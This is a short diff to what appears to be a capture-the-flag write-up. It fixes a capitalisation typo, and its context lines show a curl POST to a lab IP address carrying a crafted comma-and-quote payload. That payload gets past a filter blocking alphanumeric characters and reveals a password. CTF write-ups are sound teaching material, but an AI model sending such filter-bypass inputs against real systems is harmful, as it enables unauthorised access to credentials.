@@ -220,7 +220,7 @@ We can run the `echo $result` with the following payload
 curl -XPOST http://10.10.54.216:8001/reg.php -d 'title="",",",","","""","",""""""","""'
 ```
 
-It basically forbids the alphanumeric characters and The input is first splitted by `,` and array is created from the splitted string. It checks for some equal strings on some indexes. The above payload bypasses the code and we get a string 
+It basically forbids the alphanumeric characters and the input is first splitted by `,` and array is created from the splitted string. It checks for some equal strings on some indexes. The above payload bypasses the code and we get a string 
 
 ```bash
 Nice. Password : cimihan_are_you_here?
